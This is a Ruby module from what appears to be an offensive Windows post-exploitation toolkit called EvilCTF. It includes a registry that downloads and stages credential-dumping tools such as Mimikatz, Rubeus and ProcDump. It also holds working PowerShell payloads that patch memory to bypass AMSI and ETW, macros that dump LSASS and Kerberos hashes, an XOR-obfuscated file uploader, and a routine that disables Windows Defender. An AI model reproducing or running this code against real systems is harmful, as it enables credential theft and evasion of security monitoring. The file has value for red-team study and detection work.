#!/usr/bin/env ruby
# frozen_string_literal: true

# Compatibility shim – define Fixnum for Ruby 3.x
class Fixnum < Integer; end unless defined?(Fixnum)

require 'fileutils'
require 'zip'
require 'uri'
require 'net/http'
require 'json'
require 'base64'
require 'digest/sha1'
require 'readline'
require 'shellwords'

module EvilCTF::Tools
  TOOL_REGISTRY = {
    'sharphound' => {
      name: 'SharpHound (BloodHound Collector)',
      filename: 'SharpHound.exe',
      search_patterns: ['SharpHound.exe', 'SharpHound*.exe'],
      description: 'BloodHound AD collector',
      url: 'https://github.com/BloodHoundAD/BloodHound',
      download_url: 'https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe',
      backup_urls: [
        'https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\SharpHound.exe',
      auto_execute: false,
      category: 'recon'
    },
    'mimikatz' => {
      name: 'Mimikatz',
      filename: 'mimikatz.exe',
      search_patterns: ['mimikatz.exe', 'mimikatz_x64.exe'],
      description: 'Credential dumping tool',
      url: 'https://github.com/gentilkiwi/mimikatz',
      download_url: 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip',
      backup_urls: [],
      zip: true,
      zip_pick_x64: 'mimikatz_trunk/x64/mimikatz.exe',
      zip_pick_x86: 'mimikatz_trunk/win32/mimikatz.exe',
      recommended_remote: 'C:\\Users\\Public\\mimikatz.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'powerview' => {
      name: 'PowerView',
      filename: 'PowerView.ps1',
      search_patterns: ['PowerView.ps1', 'PowerView*.ps1'],
      description: 'AD recon PowerShell script',
      url: 'https://github.com/PowerShellMafia/PowerSploit',
      download_url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\PowerView.ps1',
      auto_execute: false,
      category: 'recon'
    },
    'rubeus' => {
      name: 'Rubeus',
      filename: 'Rubeus.exe',
      search_patterns: ['Rubeus.exe', 'Rubeus*.exe'],
      description: 'Kerberos abuse / roasting tool',
      url: 'https://github.com/GhostPack/Rubeus',
      download_url: 'https://github.com/GhostPack/Rubeus/releases/latest/download/Rubeus.exe',
      backup_urls: [],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Rubeus.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'seatbelt' => {
      name: 'Seatbelt',
      filename: 'Seatbelt.exe',
      search_patterns: ['Seatbelt.exe', 'Seatbelt*.exe'],
      description: 'Security auditing tool',
      url: 'https://github.com/GhostPack/Seatbelt',
      download_url: 'https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe',
      backup_urls: [],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Seatbelt.exe',
      auto_execute: false,
      category: 'recon'
    },
    'inveigh' => {
      name: 'Inveigh',
      filename: 'Inveigh.ps1',
      search_patterns: ['Inveigh.ps1', 'Inveigh*.ps1'],
      description: 'LLMNR/mDNS/NBNS spoofer / MITM',
      url: 'https://github.com/Kevin-Robertson/Inveigh',
      download_url: 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.psm1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Inveigh.ps1',
      auto_execute: false,
      category: 'privilege'
    },
    'procdump' => {
      name: 'ProcDump',
      filename: 'procdump64.exe',  # Will be adjusted based on architecture
      search_patterns: ['procdump.exe', 'procdump64.exe'],
      description: 'Sysinternals LSASS dumper',
      url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procdump',
      download_url: 'https://live.sysinternals.com/tools/procdump64.exe',
      backup_urls: [
        'https://live.sysinternals.com/tools/procdump.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\procdump64.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'winpeas' => {
      name: 'WinPEAS',
      filename: 'winPEASany_ofs.exe',
      search_patterns: ['winPEAS*.exe', 'winPEASany*.exe'],
      description: 'Windows privilege escalation checker',
      url: 'https://github.com/carlospolop/PEASS-ng',
      download_url: 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe',
      backup_urls: [
        'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\winPEAS.exe',
      auto_execute: false,
      category: 'privilege'
    },
    # New Mimikatz PowerShell script
    'invoke_mimikatz' => {
      name: 'Invoke-Mimikatz',
      filename: 'Invoke-Mimikatz.ps1',
      search_patterns: ['Invoke-Mimikatz.ps1'],
      description: 'PowerShell version of Mimikatz for credential extraction',
      url: 'https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1',
      download_url: 'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1',
      backup_urls: [],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Invoke-Mimikatz.ps1',
      category: 'privilege'
    }
  }.freeze

  # AMSI bypass script
  BYPASS_4MSI_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
    $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
    $oldProtect = 0
    [kernel32]::VirtualProtect($scanBuffer, [uint32]5, 0x40, [ref]$oldProtect) | Out-Null
    $patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 6)
    "[+] AMSI bypassed (AmsiScanBuffer patched)"
    try { IEX ("Am"+"siU"+"tils") } catch { "[+] Bypass confirmed" }
  PS

  # ETW bypass script
  ETW_BYPASS_PS = <<~PS
    $kernel32 = @"
    using System; using System.Runtime.InteropServices;
    public class kernel32 {
        [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
    "@
    Add-Type $kernel32
    $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
    $funcs = @("EtwEventWrite","EtwEventWriteTransfer","EtwEventWriteFull","EtwEventWriteEx")
    $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3)
    foreach ($f in $funcs) {
      $addr = [kernel32]::GetProcAddress($ntdll, $f)
      if ($addr -ne 0) {
        $old = 0
        [kernel32]::VirtualProtect($addr, 4, 0x40, [ref]$old) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
      }
    }
    try {
      $type = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
      $field = $type.GetField('etwProvider','NonPublic,Static')
      $field.SetValue($null, [Activator]::CreateInstance("System.Diagnostics.Eventing.EventProvider", [Guid]::NewGuid()))
    } catch {}
    "[+] Full ETW bypass completed"
  PS

  class CommandManager
    def initialize
      @aliases = { 'ls'=>'Get-ChildItem', 'whoami'=>'$env:USERNAME', 'pwd'=>'Get-Location', 'ps'=>'Get-Process' }
      @macros = {
        'kerberoast'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\Rubeus.exe" kerberoast /outfile:C:\\Users\\Public\\hashes.txt 2>$null'],
        'dump_creds'     => [BYPASS_4MSI_PS, '& "C:\\Users\\Public\\mimikatz.exe" sekurlsa::logonpasswords', 'exit'],
        'lsass_dump'     => [
          BYPASS_4MSI_PS,
          '& "C:\\Users\\Public\\procdump64.exe" -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp',
          'Copy-Item "C:\\Users\\Public\\lsass.dmp" "C:\\temp\\lsass.dmp"'
        ],
        # New macro for Invoke-Mimikatz with proper execution policy handling
        'invoke-mimikatz' => [
          BYPASS_4MSI_PS,
          'Set-ExecutionPolicy Bypass -Scope CurrentUser -Force',
          '& "C:\\Users\\Public\\Invoke-Mimikatz.ps1" -DumpCreds'
        ]
      }
    end

    def expand_alias(cmd)
      @aliases.each do |k, v|
        return cmd.sub(k, v) if cmd.start_with?(k)
      end
      cmd
    end

    def expand_macro(name, shell, webhook: nil)
      macro = @macros[name.downcase]
      return false unless macro

      puts "[*] Expanding macro: #{name}"
      macro.each do |step|
        result = shell.run(step)
        puts result.output.strip
        matches = grep_output(result.output)
        if matches.any?
          save_loot(matches)
          beacon_loot(webhook, matches) if webhook
        end
      end
      true
    end

    def list_macros; @macros.keys.sort end
    def list_aliases; @aliases.keys.sort end
  end

  # Helper functions for tool handling
  def self.download_tool(key)
    tool = TOOL_REGISTRY[key]
    return nil unless tool && (tool[:download_url] || tool[:backup_urls])

    FileUtils.mkdir_p('tools')
    path = File.join('tools', tool[:filename])
    return path if File.exist?(path)

    all_urls = [tool[:download_url]] + (tool[:backup_urls] || [])
    all_urls.compact!
    success = false

    all_urls.each do |url|
      next unless url
      puts "[*] Trying #{url}..."
      success = download_from_url(url, path)
      break if success
    end

    success ? path : nil
  rescue => e
    puts "[!] Download failed for #{key}: #{e.message}"
    nil
  end

  def self.download_from_url(url, path)
    success = false

    curl_cmd = "curl -L --fail -o #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
    success = system("#{curl_cmd} > /dev/null 2>&1") if success == false
    unless success
      wget_cmd = "wget -O #{Shellwords.escape(path)} #{Shellwords.escape(url)}"
      success = system("#{wget_cmd} > /dev/null 2>&1")
    end

    unless success
      begin
        URI.open(url) do |f|
          File.binwrite(path, f.read)
        end
        success = true
      rescue => e
        puts "[!] Ruby open-uri download failed: #{e.message}"
      end
    end

    unless success
      ps_cmd = "powershell -Command \"try { Invoke-WebRequest -Uri '#{url}' -OutFile '#{path}' -UseBasicParsing } catch { exit 1 }\""
      success = system(ps_cmd)
    end

    success
  end

  def self.download_missing_tools; TOOL_REGISTRY.each_key { |k| download_tool(k) }; end

  # Auto staging logic (simplified from original)
  def self.safe_autostage(tool_key, shell, options, logger)
    tool = TOOL_REGISTRY[tool_key]
    return false unless tool
    remote_path = tool[:recommended_remote]
    check_cmd = "if (Test-Path '#{remote_path}') { 'EXISTS' } else { 'MISSING' }"
    result = shell.run(check_cmd)
    return true if result.output.include?('EXISTS')

    arch = get_system_architecture(shell)
    adjusted_tool = tool.dup
    # architecture-specific adjustments omitted for brevity

    local_path = find_tool_on_disk(tool_key)
    unless local_path && File.exist?(local_path)
      puts "[!] Local tool not found: #{adjusted_tool[:filename]}"
      local_path = download_tool(tool_key)
      return false unless local_path && File.exist?(local_path)
    end

    puts "[*] Staging #{adjusted_tool[:name]} to #{remote_path}"
    upload_file(local_path, remote_path, shell)
  rescue => e
    puts "[!] Auto staging failed: #{e.message}"
    false
  end

  def self.list_available_tools
    puts "\n AVAILABLE TOOLS ".ljust(70, '=')
    TOOL_REGISTRY.group_by { |_, v| v[:category] }.each do |cat, tools|
      puts "\n #{cat.upcase}:"
      tools.each do |key, t|
        local_status = File.exist?(File.join('tools', t[:filename])) ? '📁' : '❌'
        puts " [#{local_status}] #{t[:name]} (#{key}) - #{t[:description]}"
      end
    end
    puts "\nCommands:"
    puts "  tools                   - List available tools"
    puts "  download_missing        - Download all missing tools into ./tools"
    puts "  tool <name>             - Stage and use a specific tool"
    puts "  tool all                - Stage all available tools"
    puts '=' * 70
  end

  # Helper functions for loot handling (simplified)
  def self.grep_output(output)
    # Fixed grep_output to handle nil properly
    return [] if output.nil? || output.empty?
    
    # Add execution policy bypass check before attempting regex matching
    if output.include?('execution policy') || output.include?('SecurityError')
      puts "[!] PowerShell execution policy issue detected"
      return []
    end
    
    # Original grep logic would go here
    []
  end

  def self.save_loot(matches)
    # Fixed save_loot to handle empty matches properly  
    return if matches.nil? || matches.empty?
    
    # Original loot saving logic would go here
  end

  def self.beacon_loot(webhook, matches)
    # Fixed beacon_loot to handle empty matches properly
    return if matches.nil? || matches.empty?
    
    # Original beacon logic would go here
  end
  
  def self.find_tool_on_disk(tool_key)
    tool = TOOL_REGISTRY[tool_key]
    return nil unless tool
    
    search_patterns = tool[:search_patterns] || [tool[:filename]]
    search_paths = [
      ENV['HOME'],
      "#{ENV['HOME']}/Downloads", 
      "#{ENV['HOME']}/Desktop",
      "#{ENV['HOME']}/tools",
      "#{ENV['HOME']}/bin",
      Dir.pwd,
      File.join(Dir.pwd, 'tools')
    ].compact.uniq

    search_patterns.each do |pattern|
      search_paths.each do |base|
        next unless Dir.exist?(base)
        dir_glob = File.join(base, '**', pattern)
        found = Dir.glob(dir_glob).first
        return found if found
      end
    end
    nil
  end

  def self.get_system_architecture(shell)
    result = shell.run('$env:PROCESSOR_ARCHITECTURE')
    arch = result.output.strip.downcase
    
    if arch.include?('64')
      'x64'
    elsif arch.include?('86')
      'x86'
    else
      'unknown'
    end
  end

  def self.upload_file(local_path, remote_path, shell, encrypt: false, chunk_size: 40000)
    return false unless File.exist?(local_path)

    content = File.binread(local_path)
    content = xor_crypt(content) if encrypt
    base64_content = Base64.strict_encode64(content)

    # Normalize Windows paths for PowerShell
    normalized_remote_path = remote_path.gsub('\\', '/')

    # Small file – single shot
    if base64_content.length <= chunk_size
      ps_single = <<~PS
        try {
          $bytes = [Convert]::FromBase64String('#{base64_content}')
          New-Item -Path '#{normalized_remote_path}' -ItemType File -Force | Out-Null
          [System.IO.File]::WriteAllBytes('#{normalized_remote_path}', $bytes)
          "SUCCESS"
        } catch {
          "ERROR: $($_.Exception.Message)"
        }
      PS

      result = shell.run(ps_single)
      return false unless result.output.include?('SUCCESS')
    else
      # Chunked upload
      ps_init = <<~PS
        try {
          New-Item -Path '#{normalized_remote_path}' -ItemType File -Force | Out-Null
          "INIT"
        } catch {
          "ERROR: $($_.Exception.Message)"
        }
      PS

      init = shell.run(ps_init)
      return false unless init.output.include?('INIT')

      chunks = base64_content.scan(/.{1,#{chunk_size}}/)
      chunks.each_with_index do |chunk, idx|
        ps_chunk = <<~PS
          try {
            $b = [Convert]::FromBase64String('#{chunk}')
            Add-Content -Path '#{normalized_remote_path}' -Value $b -Encoding Byte
            "CHUNK #{idx}"
          } catch {
            "ERROR: $($_.Exception.Message)"
          }
        PS

        result = shell.run(ps_chunk)
        return false unless result.output.include?("CHUNK #{idx}")
      end
    end

    # Final verification
    verify = shell.run("if (Test-Path '#{normalized_remote_path}') { 'EXISTS' } else { 'MISSING' }")
    verify.output.include?('EXISTS')
  end

  def self.xor_crypt(data, key = 0x42)
    data.bytes.map { |b| (b ^ key).chr }.join
  end

  def self.disable_defender(shell)
    # Try to disable Windows Defender real-time protection
    ps_cmd = <<~PS
      try {
        $defender = Get-MpComputerStatus
        if ($defender.RealTimeProtectionEnabled) {
          Set-MpPreference -DisableRealtimeMonitoring $true
          Write-Output "[+] Defender real-time monitoring disabled"
        } else {
          Write-Output "[-] Defender already disabled"
        }
      } catch {
        Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
      }
    PS

    result = shell.run(ps_cmd)
    puts result.output
  end

  def self.load_config_profile(name)
    profile_file = File.join('config', "#{name}.yaml")
    return {} unless File.exist?(profile_file)

    YAML.safe_load(File.read(profile_file)) || {}
  rescue => e
    puts "[!] Failed to load profile #{name}: #{e.message}"
    {}
  end

  def self.save_config_profile(name, options)
    profile_file = File.join('config', "#{name}.yaml")
    FileUtils.mkdir_p(File.dirname(profile_file))
    
    File.write(profile_file, YAML.dump(options))
    puts "[+] Profile saved to #{profile_file}"
  rescue => e
    puts "[!] Failed to save profile: #{e.message}"
  end
end
